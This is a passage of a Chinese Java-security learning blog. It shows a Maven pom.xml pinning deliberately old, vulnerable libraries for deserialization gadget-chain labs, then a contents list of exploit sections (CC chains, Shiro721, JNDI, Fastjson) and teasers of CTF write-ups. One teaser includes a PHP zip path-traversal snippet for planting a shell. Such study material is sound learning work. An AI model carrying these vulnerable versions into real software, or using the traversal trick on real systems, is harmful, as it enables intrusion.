&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">				&lt;version&gt;2.18.3&lt;/version&gt;</span><br><span class="line">			&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;8.0.45&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;tomcat-util&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;8.5.64&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">			&lt;dependency&gt;</span><br><span class="line">				&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">				&lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">				&lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">			&lt;/dependency&gt;</span><br><span class="line">			&lt;dependency&gt;</span><br><span class="line">				&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">				&lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class="line">				&lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">			&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.9&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.0.1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;hessian&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.1.5&lt;/version&gt; &lt;!-- 选择一个稳定的版本 --&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.5&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.29.2-GA&lt;/version&gt; &lt;!-- 请根据需要选择合适的版本 --&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.rometools&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;2.1.0&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.9.2&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-aop&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.2.0.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-web&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.3.4&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;hessian&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.63&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.liferay&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;com.sun.syndication&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.0.LIFERAY-PATCHED-1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2.48&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.18&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.12&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.0.2.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.0.2.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.0.2.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-expression&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.0.2.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;commons-logging&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;commons-logging&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;0.9.5.2&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-messaging&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.3.28&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-integration-core&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;5.2.7.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.2&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">	&lt;/dependencies&gt;</span><br><span class="line">	&lt;properties&gt;</span><br><span class="line">		&lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">		&lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">	&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>


</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/">http://example.com/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THM笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">THM笔记</div></div><div class="info-2"><div class="info-item-1">THM笔记部分太过简单就不再记录 Medium上有很多wp，可以借鉴 基础知识IPInternet protocol  网络地址192.168.1.1 主机地址192.168.1.101 默认网关192.168.1.255 向别的网关发送数据    MAC地址Media Access Control 前6个字符代表制造网络接口的公私，后六个字符是一个唯一的数字 LAN连接方式拓扑(Topology  星型 通过交换机或集线器连接 添加方便，成本高，不适合大规模   总线拓扑 有主干电缆， 成本低，排查困难   环形拓扑 一个坏就全完       特性 集线器（Hub） 交换机（Switch） 中继器（Repeater）    工作层次 物理层（Layer 1） 数据链路层（Layer 2） 物理层（Layer 1）   数据传输 广播所有端口 根据 MAC 地址定向转发 放大并转发信号   带宽 所有端口共享带宽 每个端口独立带宽 无带宽概念，仅用于信号放大   智能 无智能，仅转发数据 智能转发数据，避免广播 无智能，仅放大信号   ARPAddress Resolution...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2024第一场ciscn-ctfshow复现</div></div><div class="info-2"><div class="info-item-1">2024ciscn第一场本章内容均在ctfshow复现 sanicpython污染 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):...</div></div></div></a><a class="pagination-related" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024鹏程杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-17</div><div class="info-item-2">2024鹏程杯</div></div><div class="info-2"><div class="info-item-1">鹏程杯python口算1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsimport re# 发送 GET 请求获取算式def get_calculation_problem(url):    response = requests.get(url)    if response.status_code == 200:        return response.text    else:        print(&quot;Failed to retrieve the calculation problem&quot;)        return None# 解析算式并计算答案def calculate_answer(problem):    # 使用正则表达式提取算式    #calculation = re.search(r&#x27;&lt;h1&gt;(.+?)&lt;/h1&gt;&#x27;,...</div></div></div></a><a class="pagination-related" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025元旦渗透赛复现-ctfshow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2025元旦渗透赛复现-ctfshow</div></div><div class="info-2"><div class="info-item-1">2025ctfshow元旦渗透赛第一章flag1-压缩包压缩包密码爆破  flag2-图片-密码压缩包里面有个图片 PNG 文件的尾部标识符 49 45 4E 44 AE 42 60 82  提取出后边多余的文件base64解密👇出来个这个 1234567if __name__ == &#x27;__main__&#x27;:    try:        import secretMessageResponse    except ImportError:        import pip        pip.main([&#x27;install&#x27;, &#x27;secretMessageResponse&#x27;])        from secretMessageResponse import printMessage  拿python运行一下没出来一堆数据 去找库👇 pip show secretMessageResponse  crypto环境问题from Crypto.PublicKey import RSA...</div></div></div></a><a class="pagination-related" href="/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/" title="24国城杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="info-item-2">24国城杯</div></div><div class="info-2"><div class="info-item-1">2024国城杯1Easy Jellyjava欠着 2Ez_Gallery 账号admin；密码123456；直接爆也行，验证码可以重复用  存在文件包含，不知道flag在哪 info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline发现题目app.py；然后去读取题目源码 源码的shell路由是个ssti攻击点 黑名单 12345678blacklist_patterns = [r&#x27;.*length.*&#x27;,r&#x27;.*count.*&#x27;,r&#x27;.*[0-9].*&#x27;,r&#x27;.*\..*&#x27;,r&#x27;.*soft.*&#x27;]if any(re.search(pattern, expression) for pattern in blacklist_patterns):return Response(&#x27;wafwafwaf&#x27;)try:result...</div></div></div></a><a class="pagination-related" href="/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="24强网杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-26</div><div class="info-item-2">24强网杯</div></div><div class="info-2"><div class="info-item-1">24强网PyBlockly题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158from flask import Flask, request, jsonifyimport reimport unidecodeimport stringimport astimport sysimport...</div></div></div></a><a class="pagination-related" href="/2025/01/20/25suctf/" title="25suctf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-20</div><div class="info-item-2">25suctf</div></div><div class="info-2"><div class="info-item-1">Suctf2025–2标识为看的wp，没环境复现了 所有参考资料将在文本末尾标明 WEBSU_photogallery思路👇 构造一个压缩包，解压出我们想解压的部分，然后其他部分是损坏的，这样是不是就可以让整个解压过程是出错的从而进入到if里，我们的shell就这样留下了 先是php版本的漏洞 再根据源码漏洞上码 三种写码方法如下👇 法一12345678910111213&lt;?php$zip = new ZipArchive();$zipFilePath = &#x27;exp.zip&#x27;;if ($zip-&gt;open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) &#123;    $zip-&gt;addFile(&#x27;1.php&#x27;, &quot;..\./..\./a.jpg&quot;);    $zip-&gt;close();    echo &quot;ok&quot;;&#125;?&gt;  配上 12345GET...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vscode%E7%AA%81%E7%84%B6%E4%B8%8D%E7%BC%96java%E4%BB%A3%E7%A0%81%E4%BA%86%EF%BC%8C%E4%BF%AE%E7%90%86%E4%BA%86%E4%B8%80%E4%B8%8B"><span class="toc-number">1.</span> <span class="toc-text">vscode突然不编java代码了，修理了一下</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#idea%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">idea破解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.</span> <span class="toc-text">查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%A8%E9%83%A8%E9%93%BE%E5%AD%90%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">5.</span> <span class="toc-text">全部链子流程图</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E5%8C%85"><span class="toc-number">6.</span> <span class="toc-text">导包</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#maven3-2-1"><span class="toc-number">6.1.</span> <span class="toc-text">maven3.2.1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#maven4"><span class="toc-number">6.2.</span> <span class="toc-text">maven4</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8"><span class="toc-number">7.</span> <span class="toc-text">java安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">7.1.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE"><span class="toc-number">7.2.</span> <span class="toc-text">反序列化题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-number">7.3.</span> <span class="toc-text">反射</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">7.3.1.</span> <span class="toc-text">1实例化对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%8E%B7%E5%8F%96%E7%B1%BB%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">7.3.2.</span> <span class="toc-text">2获取类里面的属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E4%BF%AE%E6%94%B9%E7%B1%BB%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">7.3.3.</span> <span class="toc-text">3修改类里面的属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B0%83%E7%94%A8%E7%B1%BB%E9%87%8C%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.3.4.</span> <span class="toc-text">4调用类里面的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5hashmap%E5%B8%A6url"><span class="toc-number">7.3.5.</span> <span class="toc-text">5hashmap带url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">7.4.</span> <span class="toc-text">动态代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E9%80%9A%E8%BF%87%E5%85%B6%E4%BB%96%E5%AF%B9%E8%B1%A1%E8%AE%BF%E9%97%AE%E6%BA%90%E5%AF%B9%E8%B1%A1"><span class="toc-number">7.4.1.</span> <span class="toc-text">1通过其他对象访问源对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">7.4.1.1.</span> <span class="toc-text">静态代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-1"><span class="toc-number">7.4.1.2.</span> <span class="toc-text">动态代理</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%BE%85%E5%8A%A9%E5%87%BD%E6%95%B0"><span class="toc-number">8.</span> <span class="toc-text">使用辅助函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CC6%E9%93%BE%E5%AD%90"><span class="toc-number">9.</span> <span class="toc-text">CC6链子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">9.1.</span> <span class="toc-text">操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E9%93%BE%E5%AD%90"><span class="toc-number">9.1.1.</span> <span class="toc-text">完整链子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">9.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CC3%E9%93%BE%E5%AD%90"><span class="toc-number">10.</span> <span class="toc-text">CC3链子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#aes%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC"><span class="toc-number">10.2.</span> <span class="toc-text">aes加密脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro721"><span class="toc-number">11.</span> <span class="toc-text">Shiro721</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI"><span class="toc-number">12.</span> <span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dispatch%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB"><span class="toc-number">12.1.</span> <span class="toc-text">dispatch对应关系</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI"><span class="toc-number">13.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B01"><span class="toc-number">13.1.</span> <span class="toc-text">复现1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B02"><span class="toc-number">13.2.</span> <span class="toc-text">复现2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B03"><span class="toc-number">13.3.</span> <span class="toc-text">复现3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8u191%E4%B9%8B%E5%89%8D"><span class="toc-number">13.3.1.</span> <span class="toc-text">8u191之前</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8u191%E4%B9%8B%E5%90%8E"><span class="toc-number">13.3.2.</span> <span class="toc-text">8u191之后</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">13.3.2.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">13.3.2.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-LDAP-%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0-Gadget"><span class="toc-number">13.3.2.3.</span> <span class="toc-text">利用-LDAP-返回序列化数据，触发本地-Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">13.3.2.3.1.</span> <span class="toc-text">客户端</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson"><span class="toc-number">14.</span> <span class="toc-text">Fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">14.1.</span> <span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-24"><span class="toc-number">14.2.</span> <span class="toc-text">-1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">14.2.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pom-xml"><span class="toc-number">14.2.2.</span> <span class="toc-text">pom.xml</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25%E5%88%86%E6%9E%90"><span class="toc-number">14.3.</span> <span class="toc-text">-1.2.25分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#autoTypeSupport"><span class="toc-number">14.3.1.</span> <span class="toc-text">autoTypeSupport</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-41"><span class="toc-number">14.4.</span> <span class="toc-text">25-41</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87"><span class="toc-number">14.4.1.</span> <span class="toc-text">补丁绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42%E5%BC%80%E5%A7%8B%E4%BB%A5hash%E9%BB%91%E5%90%8D%E5%8D%95"><span 